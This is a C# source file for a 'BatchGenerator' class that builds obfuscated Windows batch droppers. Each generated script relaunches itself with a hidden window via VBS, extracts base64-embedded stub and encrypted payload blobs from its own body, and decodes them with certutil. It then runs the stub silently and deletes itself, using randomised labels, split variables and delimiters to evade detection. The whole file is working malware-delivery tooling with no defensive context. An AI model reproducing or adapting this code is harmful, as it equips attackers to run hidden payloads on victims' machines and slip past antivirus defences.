using System;
using System.Security.Cryptography;
using System.Text;

namespace JeisAlive.Engine
{
    public static class BatchGenerator
    {
        private const int DelimiterLength = 24;

        public static byte GenerateXorFixupKey()
        {
            Span<byte> buf = stackalloc byte[1];
            do
            {
                RandomNumberGenerator.Fill(buf);
            } while (buf[0] == 0);

            return buf[0];
        }

        public static string Generate(
            byte[] nativeStub,
            byte[] encryptedPayload,
            byte[]? encryptedDecoy,
            byte xorFixupKey,
            bool meltSelf)
        {
            string delimStub = GenerateDelimiter();
            string delimPayload = GenerateDelimiter();
            string? delimDecoy = encryptedDecoy != null ? GenerateDelimiter() : null;

            string b64Stub = Convert.ToBase64String(nativeStub);
            string b64Payload = Convert.ToBase64String(encryptedPayload);
            string? b64Decoy = encryptedDecoy != null ? Convert.ToBase64String(encryptedDecoy) : null;

            var labels = new BatchLabels();
            var vars = new BatchVars();

            var sb = new StringBuilder(b64Stub.Length + b64Payload.Length + 8192);

            sb.AppendLine("@echo off");
            // Self-relaunch hidden: if not already hidden, create VBS to relaunch with hidden window
            string hiddenFlag = RandomVarName();
            sb.AppendLine($"if \"%~1\"==\"{hiddenFlag}\" goto :{labels.Init}");
            sb.AppendLine($">\"%TEMP%\\~r.vbs\" echo CreateObject(\"WScript.Shell\").Run \"\"\"%~f0\"\" {hiddenFlag}\", 0, False");
            sb.AppendLine("cscript //nologo \"%TEMP%\\~r.vbs\"");
            sb.AppendLine("del /f /q \"%TEMP%\\~r.vbs\" >nul 2>&1");
            sb.AppendLine("exit /b");
            sb.AppendLine();
            sb.AppendLine("setlocal enabledelayedexpansion");
            EmitObfuscatedExtraction(sb, labels, vars, delimStub, delimPayload, delimDecoy, xorFixupKey, meltSelf);
            sb.AppendLine("endlocal");
            sb.AppendLine("exit /b");

            sb.Append(":: ");
            sb.AppendLine(delimStub);
            EmitBase64Lines(sb, b64Stub);

            sb.Append(":: ");
            sb.AppendLine(delimPayload);
            EmitBase64Lines(sb, b64Payload);

            if (delimDecoy != null)
            {
                sb.Append(":: ");
                sb.AppendLine(delimDecoy);
                EmitBase64Lines(sb, b64Decoy!);
            }

            return sb.ToString();
        }

        private static void EmitObfuscatedExtraction(
            StringBuilder sb,
            BatchLabels labels,
            BatchVars vars,
            string delimStub,
            string delimPayload,
            string? delimDecoy,
            byte xorFixupKey,
            bool meltSelf)
        {
            sb.AppendLine($"call :{labels.Init}");
            sb.AppendLine($"goto :{labels.End}");

            sb.AppendLine();
            sb.Append(':');
            sb.AppendLine(labels.Init);
            sb.AppendLine("setlocal enabledelayedexpansion");
            EmitVarSplit(sb, vars.TempDir, "%TEMP%");
            EmitVarSplit(sb, vars.RandName, "%RANDOM%%RANDOM%");
            sb.AppendLine($"call :{labels.CopyCertutil}");
            sb.AppendLine("goto :eof");

            sb.AppendLine();
            sb.Append(':');
            sb.AppendLine(labels.CopyCertutil);
            sb.AppendLine($"set \"{vars.CertCopy}=%SystemRoot%\\System32\\certutil.exe\"");
            sb.AppendLine($"call :{labels.ExtractStub}");
            sb.AppendLine("goto :eof");

            sb.AppendLine();
            sb.Append(':');
            sb.AppendLine(labels.ExtractStub);
            sb.AppendLine($"set \"{vars.HexFile}=%{vars.TempDir}%\\%{vars.RandName}%.b64s\"");
            sb.AppendLine($"set \"{vars.StubExe}=%{vars.TempDir}%\\%{vars.RandName}%s.exe\"");
            sb.AppendLine($"set \"{vars.B64File}=%{vars.TempDir}%\\%{vars.RandName}%.b64\"");
            sb.AppendLine($"set \"{vars.PayloadFile}=%{vars.TempDir}%\\%{vars.RandName}%p.bin\"");

            // Extract stub zone: find lines between delimStub and delimPayload
            string flagS = RandomVarName();
            sb.AppendLine($"set \"{flagS}=\"");
            sb.AppendLine($"(for /f \"usebackq eol= delims=\" %%a in (\"%~f0\") do (");
            sb.AppendLine($"  set \"_l=%%a\"");
            sb.AppendLine($"  if defined {flagS} (");
            sb.AppendLine($"    if \"!_l:~0,3!\"==\":: \" (set \"{flagS}=\") else (echo %%a)");
            sb.AppendLine($"  ) else (");
            sb.AppendLine($"    if \"%%a\"==\":: {delimStub}\" set \"{flagS}=1\"");
            sb.AppendLine($"  )");
            sb.AppendLine($")) > \"%{vars.HexFile}%\"");
            sb.AppendLine($"\"%{vars.CertCopy}%\" -decode \"%{vars.HexFile}%\" \"%{vars.StubExe}%\" >nul 2>&1");
            sb.AppendLine($"call :{labels.ExtractPayload}");
            sb.AppendLine("goto :eof");

            sb.AppendLine();
            sb.Append(':');
            sb.AppendLine(labels.ExtractPayload);

            // Extract payload zone: find lines between delimPayload and next delimiter (or EOF)
            string flagP = RandomVarName();
            sb.AppendLine($"set \"{flagP}=\"");
            sb.AppendLine($"(for /f \"usebackq eol= delims=\" %%a in (\"%~f0\") do (");
            sb.AppendLine($"  set \"_l=%%a\"");
            sb.AppendLine($"  if defined {flagP} (");
            sb.AppendLine($"    if \"!_l:~0,3!\"==\":: \" (set \"{flagP}=\") else (echo %%a)");
            sb.AppendLine($"  ) else (");
            sb.AppendLine($"    if \"%%a\"==\":: {delimPayload}\" set \"{flagP}=1\"");
            sb.AppendLine($"  )");
            sb.AppendLine($")) > \"%{vars.B64File}%\"");
            sb.AppendLine($"\"%{vars.CertCopy}%\" -decode \"%{vars.B64File}%\" \"%{vars.PayloadFile}%\" >nul 2>&1");
            sb.AppendLine($"call :{labels.Launch}");
            sb.AppendLine("goto :eof");

            sb.AppendLine();
            sb.Append(':');
            sb.AppendLine(labels.Launch);
            // Write payload path to .cfg file next to the stub — stub reads this to find payload
            sb.AppendLine($"echo %{vars.PayloadFile}%> \"%{vars.StubExe}%.cfg\"");
            sb.AppendLine($"start \"\" /b \"%{vars.StubExe}%\"");

            if (meltSelf)
            {
                sb.AppendLine($"call :{labels.Cleanup}");
            }

            sb.AppendLine("goto :eof");

            if (meltSelf)
            {
                sb.AppendLine();
                sb.Append(':');
                sb.AppendLine(labels.Cleanup);
                sb.AppendLine("ping -n 3 127.0.0.1 >nul 2>&1");
                sb.AppendLine($"del /f /q %{vars.HexFile}% >nul 2>&1");
                sb.AppendLine($"del /f /q %{vars.B64File}% >nul 2>&1");
                sb.AppendLine("(goto) 2>nul & del /f /q \"%~f0\"");
                sb.AppendLine("goto :eof");
            }

            sb.AppendLine();
            sb.Append(':');
            sb.AppendLine(labels.End);
        }

        private static void EmitMzFixup(StringBuilder sb, BatchVars vars, byte xorFixupKey)
        {
            if (xorFixupKey == 0)
                return;

            sb.AppendLine($"set \"{vars.FixupScript}=%{vars.TempDir}%\\%{vars.RandName}%f.vbs\"");
            sb.AppendLine($"echo Set s=CreateObject(\"ADODB.Stream\"):s.Type=1:s.Open:s.LoadFromFile WScript.Arguments(0) > %{vars.FixupScript}%");
            sb.AppendLine($"echo b=s.Read:s.Close >> %{vars.FixupScript}%");
            sb.AppendLine($"echo b(1)=b(1) Xor {xorFixupKey}:b(2)=b(2) Xor {xorFixupKey} >> %{vars.FixupScript}%");
            sb.AppendLine($"echo s.Open:s.Write b:s.SaveToFile WScript.Arguments(0),2:s.Close >> %{vars.FixupScript}%");
            sb.AppendLine($"cscript //nologo %{vars.FixupScript}% %{vars.StubExe}% >nul 2>&1");
            sb.AppendLine($"del /f /q %{vars.FixupScript}% >nul 2>&1");
        }

        private static void EmitVarSplit(StringBuilder sb, string varName, string value)
        {
            if (value.Length < 8 || value.Contains('%'))
            {
                sb.AppendLine($"set \"{varName}={value}\"");
                return;
            }

            int mid = value.Length / 2;
            string partA = RandomVarName();
            string partB = RandomVarName();
            sb.AppendLine($"set \"{partA}={value[..mid]}\"");
            sb.AppendLine($"set \"{partB}={value[mid..]}\"");
            sb.AppendLine($"set \"{varName}=%{partA}%%{partB}%\"");
        }

        private static string GenerateDelimiter()
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            Span<byte> bytes = stackalloc byte[DelimiterLength];
            RandomNumberGenerator.Fill(bytes);
            var sb = new StringBuilder(DelimiterLength);
            for (int i = 0; i < DelimiterLength; i++)
                sb.Append(chars[bytes[i] % chars.Length]);
            return sb.ToString();
        }

        private static string RandomVarName()
        {
            const string chars = "abcdefghijklmnopqrstuvwxyz";
            Span<byte> bytes = stackalloc byte[8];
            RandomNumberGenerator.Fill(bytes);
            var sb = new StringBuilder(8);
            for (int i = 0; i < 8; i++)
                sb.Append(chars[bytes[i] % chars.Length]);
            return sb.ToString();
        }

        private static void EmitBase64Lines(StringBuilder sb, string b64)
        {
            for (int i = 0; i < b64.Length; i += 76)
            {
                int len = Math.Min(76, b64.Length - i);
                sb.AppendLine(b64.Substring(i, len));
            }
        }

        private sealed class BatchLabels
        {
            public string Init { get; } = RandomLabelName();
            public string CopyCertutil { get; } = RandomLabelName();
            public string ExtractStub { get; } = RandomLabelName();
            public string FixupMz { get; } = RandomLabelName();
            public string ExtractPayload { get; } = RandomLabelName();
            public string Launch { get; } = RandomLabelName();
            public string Cleanup { get; } = RandomLabelName();
            public string End { get; } = RandomLabelName();

            private static string RandomLabelName()
            {
                const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
                Span<byte> bytes = stackalloc byte[10];
                RandomNumberGenerator.Fill(bytes);
                var sb = new StringBuilder(10);
                for (int i = 0; i < 10; i++)
                    sb.Append(chars[bytes[i] % chars.Length]);
                return sb.ToString();
            }
        }

        private sealed class BatchVars
        {
            public string TempDir { get; } = RandomVarName();
            public string RandName { get; } = RandomVarName();
            public string CertutilSrc { get; } = RandomVarName();
            public string CertCopy { get; } = RandomVarName();
            public string HexFile { get; } = RandomVarName();
            public string StubExe { get; } = RandomVarName();
            public string B64File { get; } = RandomVarName();
            public string PayloadFile { get; } = RandomVarName();
            public string FixupScript { get; } = RandomVarName();
        }
    }
}
